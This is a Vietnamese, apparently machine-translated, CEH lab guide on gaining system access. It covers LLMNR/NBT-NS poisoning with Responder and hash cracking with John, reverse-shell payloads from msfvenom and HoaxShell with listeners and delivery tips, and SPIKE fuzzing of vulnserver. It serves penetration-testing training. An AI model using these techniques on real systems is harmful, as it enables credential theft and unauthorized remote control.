Lab 1: Giành quyền truy cập vào hệ thống

**Kịch bản bài lab**

Đối với một hacker có đạo đức chuyên nghiệp hoặc chuyên gia kiểm thử xâm nhập (pentester), bước đầu tiên trong quá trình hack hệ thống là giành quyền truy cập vào hệ thống mục tiêu bằng cách sử dụng thông tin thu được và các lỗ hổng được tìm thấy trong cơ chế kiểm soát truy cập của hệ thống. Trong bước này, bạn sẽ sử dụng nhiều kỹ thuật khác nhau như bẻ khóa mật khẩu, khai thác lỗ hổng và kỹ thuật xã hội để có quyền truy cập vào hệ thống mục tiêu.

Bẻ khóa mật khẩu là quá trình khôi phục mật khẩu từ dữ liệu được truyền bởi hệ thống máy tính hoặc được lưu trữ trong đó. Nó có thể giúp người dùng khôi phục mật khẩu bị quên hoặc bị mất hoặc đóng vai trò như một biện pháp phòng ngừa của quản trị viên hệ thống để kiểm tra các mật khẩu dễ bị phá; tuy nhiên, kẻ tấn công có thể sử dụng quy trình này để có được quyền truy cập hệ thống trái phép.

Bẻ khóa mật khẩu là một trong những giai đoạn quan trọng của quá trình hack hệ thống. Việc hack thường bắt đầu bằng những nỗ lực bẻ khóa mật khẩu. Mật khẩu là thông tin quan trọng cần thiết để truy cập vào hệ thống. Do đó, hầu hết những kẻ tấn công đều sử dụng kỹ thuật bẻ khóa mật khẩu để có được quyền truy cập trái phép. Kẻ tấn công có thể bẻ khóa mật khẩu theo cách thủ công bằng cách đoán mật khẩu hoặc sử dụng các công cụ và kỹ thuật tự động như từ điển hoặc phương pháp brute-force. Hầu hết các kỹ thuật bẻ khóa mật khẩu đều thành công do mật khẩu yếu hoặc dễ đoán.

Khai thác lỗ hổng bảo mật liên quan đến việc thực hiện nhiều bước phức tạp, có liên quan đến nhau để có quyền truy cập vào hệ thống từ xa. Những kẻ tấn công sử dụng các lỗ hổng được phát hiện để phát triển các khai thác, phân phối và thực thi các khai thác trên hệ thống từ xa.

Các bài lab trong bài tập này chứng tỏ tin tặc có thể thu thập thông tin mật khẩu từ mạng của bạn dễ dàng như thế nào và chứng minh các lỗ hổng mật khẩu tồn tại trong mạng máy tính.

**Mục tiêu bài lab**

-   Thực hiện tấn công trực tuyến chủ động nhằm crack mật khẩu của hệ thống bằng cách sử dụng Replyer

-   Giành quyền truy cập vào hệ thống từ xa bằng cách sử dụng Reverse Shell Generator

-   Thực hiện tấn công tràn bộ đệm để truy cập vào hệ thống từ xa

**Tổng quan về việc giành quyền truy cập**

Các giai đoạn tấn công trước đó như theo dõi và trinh sát, quét, liệt kê và đánh giá lỗ hổng giúp xác định các lỗ hổng bảo mật và lỗ hổng bảo mật tồn tại trong tài sản CNTT của tổ chức mục tiêu. Bạn có thể sử dụng thông tin này để có quyền truy cập vào hệ thống tổ chức mục tiêu. Bạn có thể sử dụng nhiều kỹ thuật khác nhau như bẻ khóa mật khẩu và khai thác lỗ hổng để có quyền truy cập vào hệ thống mục tiêu.

Nhiệm vụ 1: Thực hiện tấn công trực tuyến chủ động để bẻ khóa mật khẩu hệ thống bằng cách sử dụng Replyer

LLMNR (Độ phân giải tên đa hướng cục bộ liên kết) và NBT-NS (Dịch vụ tên NetBIOS) là hai thành phần chính của HĐH Windows được sử dụng để thực hiện phân giải tên cho các máy chủ có trên cùng một liên kết. Các dịch vụ này được bật theo mặc định trong hệ điều hành Windows và có thể được sử dụng để trích xuất các hàm băm mật khẩu từ người dùng.

Vì nhận thức về cuộc tấn công này còn thấp nên có nhiều khả năng lấy được thông tin xác thực của người dùng trong thử nghiệm thâm nhập mạng nội bộ. Bằng cách lắng nghe các yêu cầu phát sóng LLMNR/NBT-NS, kẻ tấn công có thể giả mạo máy chủ và gửi phản hồi tự xưng là máy chủ hợp pháp. Sau khi hệ thống nạn nhân chấp nhận kết nối, có thể lấy được thông tin xác thực người dùng của nạn nhân bằng cách sử dụng một công cụ như Replyer.py.

Replyer là kẻ đầu độc LLMNR, NBT-NS và MDNS. Nó đáp ứng các truy vấn NBT-NS (NetBIOS Name Service) cụ thể dựa trên hậu tố tên của chúng. Theo mặc định, công cụ này chỉ phản hồi yêu cầu Dịch vụ Máy chủ Tệp dành cho SMB.

Tại đây, chúng tôi sẽ sử dụng công cụ Replyer để trích xuất thông tin như phiên bản hệ điều hành, phiên bản máy khách, địa chỉ IP máy khách NTLM cũng như hàm băm mật khẩu và tên người dùng NTLM.

Trong nhiệm vụ này, chúng tôi sẽ sử dụng máy Parrot Security (10.10.1.13) làm máy chủ và máy Windows 11 (10.10.1.11) làm máy mục tiêu.

1.  Nhấp vào Bảo mật Vẹt để chuyển sang máy Bảo mật Vẹt và đăng nhập bằng kẻ tấn công/toor.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

2.  Bây giờ, hãy nhấp vào Windows 11 để chuyển sang máy Windows 11 và nhấp vào Ctrl+Alt+Delete để kích hoạt máy. Nhấp vào Jason từ ngăn bên trái và nhập mật khẩu là qwerty.[Windows 11](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

> Nếu cửa sổ Chọn cài đặt quyền riêng tư cho thiết bị của bạn xuất hiện, hãy nhấp vào Tiếp theo, trong cửa sổ tiếp theo, hãy nhấp vào Tiếp theo và trong cửa sổ tiếp theo, hãy nhấp vào Chấp nhận.
>
> ![Screenshot](media/image2.jpeg){width="10.666666666666666in" height="8.0in"}

3.  Nhấp vào Bảo mật Vẹt để chuyển sang máy Bảo mật Vẹt. Nhấp vào biểu tượng MATE Terminal ở đầu cửa sổ Máy tính để bàn để mở cửa sổ terminal / dòng lệnh.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

4.  Chạy lệnh phản hồi sudo -I eth0 trong cửa sổ terminal. Trong trường mật khẩu dành cho kẻ tấn công, hãy nhập toor và nhấn Enter để chạy công cụ Phản hồi.

> Mật khẩu bạn gõ sẽ không hiển thị.
>
> **-I: chỉ định giao diện (ở đây là eth0). Tuy nhiên, giao diện mạng có thể khác trên máy của bạn, để kiểm tra sự cố giao diện bằng lệnh ifconfig.**
>
> ![Screenshot](media/image3.jpeg){width="10.666666666666666in" height="8.0in"}

5.  Phản hồi bắt đầu lắng nghe giao diện mạng cho các sự kiện, như minh họa trong ảnh chụp màn hình.

> ![Screenshot](media/image4.jpeg){width="10.666666666666666in" height="8.0in"}

6.  Nhấp vào Windows 11 để chuyển sang máy Windows 11 , nhấp chuột phải vào biểu tượng Bắt đầu và nhấp vào Chạy.[Windows 11](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

7.  Cửa sổ Chạy xuất hiện; nhập \\\\CEH-Tools vào trường Mở và nhấp vào OK.

> ![Screenshot](media/image5.jpeg){width="10.666666666666666in" height="8.0in"}

8.  Để nguyên máy Windows 11 và nhấp vào Bảo mật Parrot để chuyển về máy Parrot Scurity.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

9.  Bộ phản hồi bắt đầu ghi lại nhật ký truy cập của máy Windows 11. Nó thu thập các giá trị băm của người dùng đã đăng nhập trên máy mục tiêu, như trong ảnh chụp màn hình.

> Theo mặc định, Replyer lưu trữ nhật ký trong/usr/share/responder/logs.
>
> ![Screenshot](media/image6.jpeg){width="10.666666666666666in" height="8.0in"}

10. Bây giờ, hãy chọn giá trị băm của Jason và sao chép giá trị đó như trong ảnh chụp màn hình.

> ![Screenshot](media/image7.jpeg){width="10.666666666666666in" height="8.0in"}

11. Sau khi sao chép giá trị băm, hãy mở một cửa sổ đầu cuối, chạy lệnh sudo su và chạy lệnh Pluma hash.txt để mở tệp hash.txt.

> Trong trường mật khẩu dành cho kẻ tấn công, hãy nhập toor và nhấn Enter
>
> ![Screenshot](media/image8.jpeg){width="10.666666666666666in" height="8.0in"}

12. Trong trình soạn thảo văn bản, dán giá trị băm đã sao chép, lưu tệp và đóng cửa sổ soạn thảo văn bản.

> ![Screenshot](media/image9.jpeg){width="10.666666666666666in" height="8.0in"}

13. Bây giờ, hãy thử bẻ khóa hàm băm để tìm hiểu mật khẩu của người dùng đã đăng nhập (tại đây, Jason).

14. Trong cửa sổ terminal, hãy chạy lệnh john hash.txt để bẻ khóa mật khẩu của Jason.

15. John the Ripper bắt đầu bẻ khóa băm mật khẩu và hiển thị mật khẩu ở dạng văn bản thuần túy, như trong ảnh chụp màn hình.

> ![Screenshot](media/image10.jpeg){width="10.666666666666666in" height="8.0in"}

16. Phần này kết thúc phần minh họa thực hiện một cuộc tấn công trực tuyến tích cực nhằm bẻ khóa mật khẩu bằng cách sử dụng Replyer.

17. Đóng tất cả các cửa sổ đang mở và ghi lại tất cả thông tin thu được.

18. Nhấp vào Windows 11 để chuyển sang máy Windows 11. Nhấp vào biểu tượng Bắt đầu ở góc dưới bên trái của Màn hình, nhấp vào biểu tượng người dùng và nhấp vào Đăng xuất. Bạn sẽ bị đăng xuất khỏi tài khoản của Jason[Windows 11](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

> Nếu cửa sổ Bảo mật Windows xuất hiện, hãy đóng cửa sổ đó lại.

**Câu 6.1.1.1**

Chạy công cụ Replyer trên máy Parrot Security và tìm hàm băm NTLM cho người dùng Jason trên Windows 11. Mô phỏng người dùng Jason (người dùng: Jason và mật khẩu: qwerty) trên máy Windows 11. Nhập tùy chọn chỉ định giao diện khi chạy công cụ Replyer.

![](media/image12.wmf)

Nhiệm vụ 2: Giành quyền truy cập vào Hệ thống từ xa bằng cách sử dụng Reverse Shell Generator

Trình tạo shell đảo ngược là một công cụ hoặc tập lệnh được sử dụng trong an ninh mạng và hack có đạo đức để tạo tải trọng shell đảo ngược. Reverse shell là một loại shell trong đó hệ thống đích kết nối ngược lại với hệ thống của kẻ tấn công, cho phép kẻ tấn công thực thi các lệnh trên hệ thống đích từ xa.

Trong bài lab trước, chúng ta đã thấy cách tạo tải trọng và trình nghe theo cách thủ công, bây giờ chúng ta sẽ tự động hóa quy trình này bằng cách sử dụng Reverse Shell Generator.

1.  Nhấp vào Bảo mật Vẹt để chuyển sang máy Bảo mật Vẹt. Mở cửa sổ terminal / dòng lệnh và thực thi sudo su để chạy các chương trình với tư cách là người dùng root (Khi được nhắc, hãy nhập mật khẩu).[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

2.  Trong cửa sổ terminal, hãy chạy lệnh docker run -d -p 80:80 Reverse_shell_generator để khởi động Reverse Shell Generator.

> Nếu bạn gặp lỗi, hãy chạy lệnh dừng dịch vụ apache2 và thực hiện lại Bước#2.
>
> ![Screenshot](media/image13.jpeg){width="10.666666666666666in" height="8.0in"}

3.  Bây giờ, hãy khởi chạy trình duyệt web Firefox và truy cập http://localhost để truy cập GUI Reverse Shell Generator.

> ![Screenshot](media/image14.jpeg){width="10.666666666666666in" height="8.0in"}

4.  Chúng tôi sẽ tạo tải trọng bằng cách sử dụng bộ lệnh được xác định trước trong Reverse Shell Generator. Để làm như vậy, trước tiên chúng ta cần đặt IP và số cổng.

5.  Trong trường IP, hãy nhập 10.10.1.13 làm IP người nghe và trong trường Cổng, hãy nhập 4444 làm cổng người nghe.

> ![Screenshot](media/image15.jpeg){width="10.666666666666666in" height="8.0in"}

6.  Bây giờ, chúng ta sẽ tạo tải trọng bằng tùy chọn msfvenom có ​​trong công cụ tạo shell đảo ngược. Để làm như vậy, hãy nhấp vào tab MSFVenom. Bạn có thể quan sát lệnh msfvenom mà bạn có thể sử dụng để tạo tải trọng (tại đây, đảo ngược.exe).

> Ở đây, chúng tôi đang chọn Windows Meterpreter Staged Reverse TCP (x64) từ phần MSFVenom để tạo tải trọng.
>
> ![Screenshot](media/image16.jpeg){width="10.666666666666666in" height="8.0in"}

7.  Cuộn xuống và nhấp vào nút Sao chép để sao chép mã MSFVenom.

8.  Chuyển sang cửa sổ terminal / dòng lệnh và dán mã đã sao chép vào terminal / dòng lệnh rồi nhấn Enter để tạo tải trọng với IP 10.10.1.13 và cổng 4444.

> ![Screenshot](media/image17.jpeg){width="10.666666666666666in" height="8.0in"}

9.  Chúng ta sẽ khởi động trình nghe bằng cách sử dụng Reverse Shell Generator, để làm như vậy, hãy chuyển sang cửa sổ trình duyệt và chọn msfconsole làm Loại từ trình đơn thả xuống bên dưới Trình nghe.

10. Một mã sẽ được tạo với địa chỉ IP và số cổng đã chọn, hãy nhấp vào Sao chép để sao chép mã.

> ![shell1.jpg](media/image18.jpeg){width="10.666666666666666in" height="8.0in"}

11. Bây giờ, chuyển sang cửa sổ terminal và dán mã đã sao chép để khởi động trình nghe.

> ![Screenshot](media/image19.jpeg){width="10.666666666666666in" height="8.0in"}

12. Khi chúng tôi đã khởi động trình nghe, bây giờ chúng tôi sẽ chuyển tải trọng đến máy nạn nhân, ở đây, chúng tôi đang chuyển tải trọng bằng thư mục dùng chung.

13. Nhấp vào Địa điểm từ Máy tính để bàn và nhấp vào Thư mục chính để điều hướng đến tệp /home/kẻ tấn công và sao chép tệp reverse.exe.

> ![Screenshot](media/image20.jpeg){width="10.666666666666666in" height="8.0in"}

14. Nhấp vào menu Địa điểm ở đầu Máy tính để bàn và nhấp vào ceh-tools trên 10.10.1.11 từ các tùy chọn thả xuống.

> Nếu không có tùy chọn ceh-tools trên 10.10.1.11 thì hãy làm theo các bước dưới đây để truy cập thư mục CEH-Tools:

-   Nhấp vào menu Địa điểm hiện ở đầu Màn hình và chọn Mạng từ các tùy chọn thả xuống

-   Cửa sổ Mạng xuất hiện; nhấn Ctrl+L. Trường Vị trí xuất hiện; nhập smb://10.10.1.11 và nhấn Enter để truy cập vào các thư mục dùng chung của Windows 11.

-   Cửa sổ bật lên bảo mật xuất hiện; nhập thông tin đăng nhập của máy Windows 11 (Admin/Pa\$\$w0rd) và nhấp vào Kết nối.

-   Cửa sổ chia sẻ Windows trên 10.10.1.11 xuất hiện; nhấp đúp vào thư mục CEH-Tools.

15. Chuyển đến phần Hacking hệ thống CEHv13 Mô-đun 06 và dán tệp Reverse.exe đã sao chép.

16. Nhấp vào Windows 11 để chuyển sang máy Windows 11 , điều hướng đến E:\\CEH-Tools\\CEHv13 Mô-đun 06 Hack hệ thống và sao chép tệp reverse.exe rồi dán vào Màn hình nền.[Windows 11](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

> Ở đây, chúng tôi đang gửi tải trọng độc hại thông qua một thư mục dùng chung; tuy nhiên, trong thời gian thực, bạn có thể gửi nó qua tệp đính kèm trong email hoặc thông qua các phương tiện vật lý như ổ cứng hoặc ổ bút.
>
> ![Screenshot](media/image21.jpeg){width="10.666666666666666in" height="8.0in"}

17. Nhấp đúp vào tệp reverse.exe để chạy tệp đó. Nếu cửa sổ bật lên Kiểm soát tài khoản người dùng xuất hiện, hãy nhấp vào Có.

18. Nhấp vào Bảo mật Vẹt để chuyển sang máy Bảo mật Vẹt. Chuyển sang cửa sổ terminal, bạn có thể thấy phiên đã được tạo bằng máy Windows 11.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

> ![Screenshot](media/image22.jpeg){width="10.666666666666666in" height="8.0in"}

19. Nhập getuid và nhấn Enter. Điều này sẽ hiển thị ID người dùng hiện tại, như được hiển thị trong ảnh chụp màn hình.

> ![Screenshot](media/image23.jpeg){width="10.666666666666666in" height="8.0in"}

20. Đóng cửa sổ đầu cuối.

21. Bây giờ, chúng ta sẽ có quyền truy cập vào hệ thống từ xa bằng tập lệnh PowerShell. Để làm như vậy, hãy chuyển sang cửa sổ trình duyệt và chọn tab HoaxShell.

22. Trong phần HoaxShell, chọn PowerShell IEX từ ngăn bên trái (thay đổi số cổng thành 444 trong phần tải trọng) và nhấp vào nút Sao chép ở dưới cùng để sao chép phần tải trọng.

> ![shell2.jpg](media/image24.jpeg){width="10.666666666666666in" height="8.0in"}

23. Mở một cửa sổ terminal mới dưới dạng siêu người dùng và chạy lệnh Pluma shell.ps1 để mở cửa sổ soạn thảo văn bản.

24. Trong cửa sổ soạn thảo văn bản shell.ps1, hãy dán mã đã sao chép. Lưu tệp và đóng cửa sổ soạn thảo văn bản.

> ![Screenshot](media/image25.jpeg){width="10.666666666666666in" height="8.0in"}

25. Bây giờ, chúng tôi sẽ chạy trình nghe trò lừa bịp, để làm như vậy, hãy chuyển sang trình duyệt Firefox và đảm bảo số cổng là 444, chọn hoaxshell từ trình đơn thả xuống Loại trong phần Trình nghe và nhấp vào Sao chép để sao chép mã.

> ![Screenshot](media/image26.jpeg){width="10.666666666666666in" height="8.0in"}

26. Chuyển sang cửa sổ terminal và dán mã đã sao chép để khởi động trình nghe.

> ![Screenshot](media/image27.jpeg){width="10.666666666666666in" height="8.0in"}

27. Nhấp vào Địa điểm từ Máy tính để bàn và nhấp vào Thư mục chính để điều hướng đến vị trí /home/Attacker và sao chép tệp shell.ps1 rồi dán vào thư mục CEHv13 Module 06 System Hacking của ceh-tools ngày 10.10.1.11

> ![Screenshot](media/image28.jpeg){width="10.666666666666666in" height="8.0in"}

28. Nhấp vào Windows 11 để chuyển sang máy Windows 11 , điều hướng đến E:\\CEH-Tools\\CEHv13 Mô-đun 06 Hack hệ thống và sao chép tệp shell.ps1 rồi dán vào Màn hình nền.[Windows 11](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

> Ở đây, chúng tôi đang gửi tải trọng độc hại thông qua một thư mục dùng chung; tuy nhiên, trong thời gian thực, bạn có thể gửi nó qua tệp đính kèm trong email hoặc thông qua các phương tiện vật lý như ổ cứng hoặc ổ bút.
>
> ![Screenshot](media/image29.jpeg){width="10.666666666666666in" height="8.0in"}

29. Bây giờ, chúng ta sẽ chạy tệp Shell.ps1 này với tư cách là người dùng hợp pháp.

30. Trong loại tìm kiếm Windows powershell và nhấp vào Chạy với tư cách quản trị viên trong Windows PowerShell để mở cửa sổ PowerShell.

> Nếu cửa sổ bật lên Kiểm soát tài khoản người dùng xuất hiện, hãy nhấp vào Có.

31. Trong cửa sổ PowerShell, hãy chạy cd C:\\Users\\Admin\\Desktop\\ để điều hướng đến Màn hình nền.

32. Thực thi .\\shell.ps1 để chạy tệp shell.ps1.

> ![12121.png](media/image30.jpeg){width="10.666666666666666in" height="8.0in"}

33. Nhấp vào Bảo mật Vẹt để chuyển sang máy Bảo mật Vẹt. Chuyển sang cửa sổ terminal, bạn có thể thấy phiên đã được tạo bằng máy Windows 11.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

34. Để kiểm tra tên người dùng đã đăng nhập, hãy nhập whoami và nhấn Enter. Công cụ hiển thị tên người dùng của người dùng hiện đang đăng nhập.

> ![Screenshot](media/image31.jpeg){width="10.666666666666666in" height="8.0in"}

35. Phần này kết thúc phần trình diễn cách truy cập vào hệ thống từ xa bằng cách sử dụng Reverse Shell Generator.

36. Đóng tất cả các cửa sổ đang mở và ghi lại tất cả thông tin thu được.

**Câu 6.1.2.1**

Trong máy Parrot Security, sử dụng Reverse Shell Generator để tạo tải trọng và thiết lập trình nghe để có quyền truy cập vào máy Windows 11. Nhập loại tải trọng được chọn trong tab HoaxShell để tạo tập lệnh PowerShell dùng để xâm phạm máy Windows 11.

![](media/image12.wmf)

Nhiệm vụ 3: Thực hiện tấn công tràn bộ đệm để giành quyền truy cập vào hệ thống từ xa

Bộ đệm là vùng chứa các vị trí bộ nhớ liền kề được phân bổ cho một chương trình hoặc ứng dụng để xử lý dữ liệu thời gian chạy của nó. Tràn hoặc tràn bộ đệm là một lỗ hổng phổ biến trong các ứng dụng hoặc chương trình chấp nhận nhiều dữ liệu hơn bộ đệm được phân bổ. Lỗ hổng này cho phép ứng dụng vượt quá bộ đệm trong khi ghi dữ liệu vào bộ đệm và ghi đè lên các vị trí bộ nhớ lân cận. Hơn nữa, lỗ hổng này dẫn đến hoạt động thất thường của hệ thống, sự cố hệ thống, lỗi truy cập bộ nhớ, v.v. Kẻ tấn công khai thác lỗ hổng tràn bộ đệm để tiêm mã độc vào bộ đệm nhằm làm hỏng tệp, sửa đổi dữ liệu chương trình, truy cập thông tin quan trọng, leo thang đặc quyền, giành quyền truy cập shell, v.v.

Tác vụ này thể hiện quy trình khai thác được áp dụng cho một máy chủ dễ bị tấn công đang chạy trên hệ thống của nạn nhân. Máy chủ dễ bị tấn công này được gắn vào Trình gỡ lỗi miễn dịch. Với tư cách là kẻ tấn công, chúng tôi sẽ khai thác máy chủ này bằng cách sử dụng tập lệnh độc hại để giành quyền truy cập từ xa vào hệ thống của nạn nhân.

Trong nhiệm vụ này, chúng tôi sử dụng máy Parrot Security (10.10.1.13) làm máy chủ và máy Windows 11 (10.10.1.11) làm máy mục tiêu.

1.  Nhấp vào Windows 11 để chuyển sang máy Windows 11. Khởi động lại máy và đăng nhập bằng Admin\\Pa\$\$w0rd.[Windows 11](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

2.  Điều hướng đến E:\\CEH-Tools\\CEHv13 Mô-đun 06 System Hacking\\Buffer Overflow Tools\\vulnserver, nhấp chuột phải vào tệp vulnserver.exe và nhấp vào tùy chọn Chạy với tư cách quản trị viên.

> Nếu cửa sổ bật lên Kiểm soát tài khoản người dùng xuất hiện, hãy nhấp vào Có để tiếp tục.
>
> ![new1.jpg](media/image32.jpeg){width="10.666666666666666in" height="8.0in"}
>
> Nếu cửa sổ Cảnh báo Bảo mật Windows xuất hiện; nhấp vào Cho phép truy cập.

3.  Vulnserver bắt đầu chạy, như minh họa trong ảnh chụp màn hình.

> ![qqererwe.jpg](media/image33.jpeg){width="10.666666666666666in" height="8.0in"}

4.  Thu nhỏ cửa sổ Dấu nhắc lệnh chạy Vulnserver.

5.  Điều hướng đến E:\\CEH-Tools\\CEHv13 Mô-đun 06 System Hacking\\Buffer Overflow Tools\\Immunity Debugger, nhấp chuột phải vào ImmunityDebugger_1\_85_setup.exe và nhấp vào tùy chọn Chạy với tư cách quản trị viên.

> Nếu cửa sổ bật lên Kiểm soát tài khoản người dùng xuất hiện, hãy nhấp vào Có để tiếp tục.
>
> ![Screenshot](media/image34.jpeg){width="10.666666666666666in" height="8.0in"}

6.  Cửa sổ bật lên Cài đặt trình gỡ lỗi miễn dịch xuất hiện, hãy nhấp vào Có để cài đặt Python.

7.  Cửa sổ Thiết lập trình gỡ lỗi miễn dịch: Thỏa thuận cấp phép xuất hiện; nhấp vào hộp kiểm Tôi chấp nhận rồi nhấp vào Tiếp theo.

> ![Screenshot](media/image35.jpeg){width="10.666666666666666in" height="8.0in"}

8.  Làm theo trình hướng dẫn và cài đặt Trình gỡ lỗi miễn dịch bằng cài đặt mặc định.

9.  Sau khi hoàn tất cài đặt, nhấp vào Đóng. Cửa sổ bật lên Cài đặt trình gỡ lỗi miễn dịch xuất hiện, nhấp vào OK để cài đặt python.

> ![Screenshot](media/image36.jpeg){width="10.666666666666666in" height="8.0in"}

10. Cửa sổ Thiết lập Python xuất hiện, nhấp vào Tiếp theo và làm theo trình hướng dẫn để cài đặt Python bằng cài đặt mặc định.

> ![Screenshot](media/image37.jpeg){width="10.666666666666666in" height="8.0in"}

11. Sau khi hoàn tất quá trình cài đặt, hãy điều hướng đến Màn hình nền, nhấp chuột phải vào phím tắt Trình gỡ lỗi miễn dịch và nhấp vào Chạy với tư cách quản trị viên.

> Nếu cửa sổ bật lên Kiểm soát tài khoản người dùng xuất hiện, hãy nhấp vào Có để tiếp tục.
>
> ![Screenshot](media/image38.jpeg){width="10.666666666666666in" height="8.0in"}

12. Cửa sổ chính của Trình gỡ lỗi miễn dịch xuất hiện như trong ảnh chụp màn hình.

> ![Screenshot](media/image39.jpeg){width="10.666666666666666in" height="8.0in"}

13. Bây giờ, hãy nhấp vào Tệp trong thanh menu và trong menu thả xuống, hãy nhấp vào Đính kèm.

> ![Screenshot](media/image40.jpeg){width="10.666666666666666in" height="8.0in"}

14. Cửa sổ bật lên Chọn để đính kèm xuất hiện; nhấp vào quy trình máy chủ lỗ hổng và nhấp vào Đính kèm.

> ![Screenshot](media/image41.jpeg){width="10.666666666666666in" height="8.0in"}

15. Trình gỡ lỗi miễn dịch hiển thị cửa sổ quy trình vulnerserver.exe xuất hiện.

16. Bạn có thể nhận thấy trạng thái là Tạm dừng ở góc dưới cùng bên phải của cửa sổ.

> ![Screenshot](media/image42.jpeg){width="10.666666666666666in" height="8.0in"}

17. Nhấp vào biểu tượng Chạy chương trình trên thanh công cụ để chạy Trình gỡ lỗi miễn dịch.

> ![im2.jpg](media/image43.jpeg){width="10.666666666666666in" height="8.0in"}

18. Bạn có thể quan sát thấy trạng thái thay đổi thành Đang chạy ở góc dưới cùng bên phải của cửa sổ, như minh họa trong ảnh chụp màn hình.

> ![Screenshot](media/image44.jpeg){width="10.666666666666666in" height="8.0in"}

19. Tiếp tục chạy Trình gỡ lỗi miễn dịch và Máy chủ lỗ hổng, rồi nhấp vào Bảo mật Parrot chuyển sang máy Bảo mật Parrot.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

20. Bây giờ chúng ta sẽ sử dụng lệnh Netcat để thiết lập kết nối với máy chủ dễ bị tấn công mục tiêu và xác định các dịch vụ hoặc chức năng do máy chủ cung cấp.

21. Trong máy Bảo mật Parrot, hãy mở một cửa sổ terminal / dòng lệnh và thực thi sudo su để chạy các chương trình với tư cách là người dùng root (Khi được nhắc, hãy nhập cả mật khẩu).

> Mật khẩu bạn gõ sẽ không hiển thị.

22. Bây giờ, hãy chạy lệnh cd để chuyển đến thư mục gốc.

23. Thực thi lệnh nc -nv 10.10.1.11 9999.

> Ở đây, 10.10.1.11 là địa chỉ IP của máy mục tiêu (Windows 11) và 9999 là cổng mục tiêu.

24. Chào mừng bạn đến với Máy chủ dễ bị tổn thương! tin nhắn xuất hiện; gõ TRỢ GIÚP và nhấn Enter.

25. Danh sách Lệnh hợp lệ được hiển thị như trong ảnh chụp màn hình.

> ![Screenshot](media/image45.jpeg){width="10.666666666666666in" height="8.0in"}

26. Nhập EXIT và nhấn Enter để thoát khỏi chương trình.

> ![t825new.jpg](media/image46.jpeg){width="10.666666666666666in" height="8.0in"}

27. Bây giờ, chúng ta sẽ tạo các mẫu tăng đột biến và thực hiện tăng đột biến.

> Mẫu Spike xác định các định dạng gói được sử dụng để liên lạc với máy chủ dễ bị tấn công. Chúng rất hữu ích cho việc kiểm tra và xác định các chức năng dễ bị khai thác tràn bộ đệm.

28. Để tạo mẫu tăng đột biến để tăng đột biến chức năng STATS, hãy chạy lệnh Pluma stats.spk để mở trình soạn thảo văn bản.

> ![Screenshot](media/image47.jpeg){width="10.666666666666666in" height="8.0in"}

29. Trong cửa sổ soạn thảo văn bản, nhập tập lệnh sau:

> **s_readline();**
>
> **s_string(\"THỐNG KÊ \");**
>
> **s_string_variable(\"0\");**

30. Nhấn Ctrl+S để lưu tệp tập lệnh và đóng trình soạn thảo văn bản.

> ![Screenshot](media/image48.jpeg){width="10.666666666666666in" height="8.0in"}

31. Bây giờ, trong cửa sổ terminal, hãy chạy lệnh generic_send_tcp 10.10.1.11 9999 stats.spk 0 0 để gửi gói đến máy chủ dễ bị tấn công.

> Ở đây, 10.10.1.11 là địa chỉ IP của máy mục tiêu (Windows 11), 9999 là số cổng mục tiêu, stats.spk là Spike_script và 0 và 0 là các giá trị của SKIPVAR và SKIPSTR.

32. Để tập lệnh chạy trong cửa sổ terminal.

> ![Screenshot](media/image49.jpeg){width="10.666666666666666in" height="8.0in"}

33. Bây giờ, hãy nhấp vào Windows 11 để chuyển sang máy mục tiêu (ở đây là Windows 11) và trong cửa sổ Trình gỡ lỗi miễn nhiễm , bạn có thể quan sát thấy trạng thái quy trình vẫn là Đang chạy, điều này cho biết rằng chức năng STATS không dễ bị tràn bộ đệm. Bây giờ, chúng ta sẽ lặp lại quy trình tương tự với hàm TRUN.[Windows 11](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

> ![Screenshot](media/image50.jpeg){width="10.666666666666666in" height="8.0in"}

34. Nhấp vào Bảo mật Vẹt chuyển về máy Bảo mật Vẹt.[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

35. Trong cửa sổ terminal / dòng lệnh, nhấn Ctrl+C để kết thúc tập lệnh stats.spk.

36. Bây giờ, hãy chạy lệnh pluma trun.spk để mở trình soạn thảo văn bản.

37. Trong cửa sổ soạn thảo văn bản, nhập tập lệnh sau:

> **s_readline();**
>
> **s_string(\"TRUN \");**
>
> **s_string_variable(\"0\");**

38. Nhấn Ctrl+S để lưu tệp tập lệnh và đóng trình soạn thảo văn bản.

> ![Screenshot](media/image51.jpeg){width="10.666666666666666in" height="8.0in"}

39. Bây giờ, trong cửa sổ terminal / dòng lệnh, hãy chạy lệnh generic_send_tcp 10.10.1.11 9999 trun.spk 0 0 để gửi các gói đến máy chủ dễ bị tấn công.

> Ở đây, 10.10.1.11 là địa chỉ IP của máy mục tiêu (Windows 11), 9999 là số cổng mục tiêu, trun.spk là spike_script và 0 và 0 là các giá trị của SKIPVAR và SKIPSTR.

40. Để tập lệnh chạy trong cửa sổ terminal.

> ![Screenshot](media/image52.jpeg){width="10.666666666666666in" height="8.0in"}

